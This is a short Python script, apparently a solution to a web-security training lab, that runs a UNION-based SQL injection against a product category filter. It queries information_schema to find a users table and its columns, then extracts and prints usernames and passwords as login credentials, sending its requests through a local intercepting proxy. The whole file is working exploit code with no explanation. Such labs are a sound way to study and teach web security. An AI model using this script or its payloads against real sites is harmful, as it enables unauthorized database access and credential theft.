#List database information using query information_schema.table, columns to get login credentials
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
path = 'filter?category=Gifts'

def get_table(url):
	payload = "' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_name LIKE 'users%'--"
	r = requests.get(url + path + payload, verify=False, proxies=proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	table = ''.join([td.get_text() for td in soup.find_all('td')])
	return table

def get_columns(url, table):
	payload = f"' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='{table}'--"
	r = requests.get(url + path + payload, verify=False, proxies=proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	columns = [td.get_text() for td in soup.find_all('td')]
	return columns

def sqli_payload(url):
	table = get_table(url)
	columns = get_columns(url, table)
	payload = f"' UNION SELECT {columns[0]}, {columns[1]} || ' - ' || {columns[2]} FROM {table}--"
	r = requests.get(url + path + payload, verify=False, proxies=proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	credentials = '\n'.join([td.get_text() for td in soup.find_all('td')])
	return credentials

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f'\033[31m[-] Usage: {sys.argv[0]} <url>\033[0m')
		print(f'\033[31m[-] Example: {sys.argv[0]} www.example\033[0m')
		sys.exit(1)
	try:
		credentials = sqli_payload(url)
		if credentials:
			print(f'\033[32m[+] Credentials for login:\n\033[0m{credentials}')
			print('\033[32m[+] SQLi Successful!\033[0m')
		else:
			print('\033[31m[-] SQLi Unsuccessful!!!\033[0m')
	except KeyboardInterrupt:
			print('\033[33m[+] Exited...\033[0m')
